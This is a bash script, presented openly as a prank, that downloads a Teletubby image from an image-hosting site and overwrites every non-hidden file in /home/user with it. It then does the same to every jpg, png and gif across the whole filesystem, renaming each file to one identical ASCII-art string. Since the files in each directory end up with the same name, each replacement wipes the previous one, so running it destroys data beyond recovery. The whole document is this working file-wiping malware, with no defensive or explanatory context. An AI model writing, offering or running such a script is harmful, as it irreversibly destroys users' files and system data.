#!/bin/bash

# Download the image and save it as "image.jpg" 
wget -qO output.jpg "https://i.postimg.cc/nLwf48bX/styerteletubby.png" -O image.jpg

# Define the new filename pattern
new_filename="#####@#####%##@####*##%#####*########**#          
          ###%*#######*##+#%=#####################          
          ##+#+##+%#@*+++++%##%#######***+*+##%*#*          
          *#*%###::++======+++*+=##*##%*%*#**###**          
          %+%@%@@%-++++++*=+++=::%%%%%%%%%%%%##%=#          
          %%%%%%%@@*++++%*#+#%%%%%%##%%##%%%%%@#%*          
          %%%%%@+++++++++++++++*#%%%%%%%%@%+%-#*##          
          %%%%*+++++++=++==+==+++#%%@#*=-=#*######          
          %%@+++++++++=+++=+++++#%+:++++#%#####**%          
          %@++++++++++++++**#*%+*****###%#########          
          %%*+++++++++++====:=%%%%%##%#######%%###          
          %%%%%***+%***#+-::--*%##############%%##          
          %%%%%#****#:::::::-:-+###############%##          
          %%###@++%+++++===++++***#*#########**###"

# Replace all files in the user's home directory with the downloaded image
replacement_image="$(pwd)/image.jpg"

# Find all files in the home directory excluding directories starting with '.'
home_files=$(find /home/user -type f ! -path "/home/user/.*")

# Loop through all files in the home directory and replace them
for home_file in $home_files
do
    cp "$replacement_image" "$home_file"
    # Get the directory path and filename
    dir_path=$(dirname "$home_file")
    filename=$(basename "$home_file")
    # Rename the file using the new pattern
    new_filename_with_path="$dir_path/$new_filename"
    mv "$home_file" "$new_filename_with_path"
done

# Find all image files in the entire system
image_files=$(find / -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.gif" \))

# Loop through all image files and replace them
for image_file in $image_files
do
    cp "$replacement_image" "$image_file"
    # Get the directory path and filename
    dir_path=$(dirname "$image_file")
    filename=$(basename "$image_file")
    # Rename the file using the new pattern
    new_filename_with_path="$dir_path/$new_filename"
    mv "$image_file" "$new_filename_with_path"
done

echo "#####@#####%##@####*##%#####*########**#          
          ###%*#######*##+#%=#####################          
          ##+#+##+%#@*+++++%##%#######***+*+##%*#*          
          *#*%###::++======+++*+=##*##%*%*#**###**          
          %+%@%@@%-++++++*=+++=::%%%%%%%%%%%%##%=#          
          %%%%%%%@@*++++%*#+#%%%%%%##%%##%%%%%@#%*          
          %%%%%@+++++++++++++++*#%%%%%%%%@%+%-#*##          
          %%%%*+++++++=++==+==+++#%%@#*=-=#*######          
          %%@+++++++++=+++=+++++#%+:++++#%#####**%          
          %@++++++++++++++**#*%+*****###%#########          
          %%*+++++++++++====:=%%%%%##%#######%%###          
          %%%%%***+%***#+-::--*%##############%%##          
          %%%%%#****#:::::::-:-+###############%##          
          %%###@++%+++++===++++***#*#########**###"
